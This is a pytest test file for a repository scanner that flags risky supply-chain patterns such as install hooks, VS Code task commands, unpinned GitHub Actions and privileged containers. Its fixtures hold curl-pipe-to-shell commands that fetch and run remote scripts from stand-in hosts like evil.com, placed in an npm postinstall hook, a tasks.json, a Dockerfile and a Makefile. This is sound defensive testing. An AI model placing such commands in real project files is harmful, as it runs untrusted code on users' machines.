"""Risky-file scanner tests."""

from __future__ import annotations

import json
from pathlib import Path

from ossvet.scanners.risky_files import RiskyFilesScanner


def test_postinstall_script_flagged(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "package.json").write_text(json.dumps({
        "name": "evil",
        "scripts": {"postinstall": "curl https://x.com/i.sh | sh"},
    }), encoding="utf-8")
    result = RiskyFilesScanner().run(repo)
    assert result.status == "ok"
    cats = {f.category for f in result.findings}
    assert "npm_install_script" in cats


def test_setup_py_cmdclass_flagged(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "setup.py").write_text(
        "from setuptools import setup\n"
        "from setuptools.command.install import install\n"
        "class CustomInstall(install):\n"
        "    def run(self):\n"
        "        super().run()\n"
        "setup(name='x', cmdclass={'install': CustomInstall})\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    cats = {f.category for f in result.findings}
    assert "setup_py_hook" in cats


def test_clean_setup_py_no_finding(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "setup.py").write_text(
        "from setuptools import setup\n"
        "setup(name='x', version='1.0', packages=['x'])\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    assert all(f.category != "setup_py_hook" for f in result.findings)


def test_vscode_tasks_with_command_flagged(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    vscode = repo / ".vscode"
    vscode.mkdir(parents=True)
    (vscode / "tasks.json").write_text(json.dumps({
        "tasks": [{"label": "evil", "command": "/bin/sh", "args": ["-c", "curl evil.com | sh"]}],
    }), encoding="utf-8")
    result = RiskyFilesScanner().run(repo)
    cats = {f.category for f in result.findings}
    assert "vscode_exec_config" in cats


def test_workflow_pull_request_target(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    wf = repo / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "name: CI\n"
        "on:\n"
        "  pull_request_target:\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@v3\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    titles = " ".join(f.title for f in result.findings)
    assert "pull_request_target" in titles


def test_unpinned_third_party_action(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    wf = repo / ".github" / "workflows"
    wf.mkdir(parents=True)
    (wf / "ci.yml").write_text(
        "on: push\n"
        "jobs:\n"
        "  x:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: third/party@v1\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    titles = " ".join(f.title for f in result.findings)
    assert "third/party" in titles


def test_dockerfile_curl_pipe_flagged(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Dockerfile").write_text(
        "FROM ubuntu\nRUN curl https://x.com/install.sh | sh\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    titles = " ".join(f.title for f in result.findings)
    assert "Dockerfile" in titles


def test_compose_privileged_flagged(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "docker-compose.yml").write_text(
        "services:\n  app:\n    image: x\n    privileged: true\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    titles = " ".join(f.title for f in result.findings)
    assert "privileged" in titles


def test_makefile_curl_pipe(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "Makefile").write_text(
        "install:\n\tcurl https://x.com/i.sh | bash\n",
        encoding="utf-8",
    )
    result = RiskyFilesScanner().run(repo)
    titles = " ".join(f.title for f in result.findings)
    assert "Makefile" in titles


def test_no_files_means_no_findings(tmp_path: Path) -> None:
    repo = tmp_path / "repo"
    repo.mkdir()
    (repo / "README.md").write_text("# Hello\n", encoding="utf-8")
    result = RiskyFilesScanner().run(repo)
    assert result.status == "ok"
    assert result.findings == []
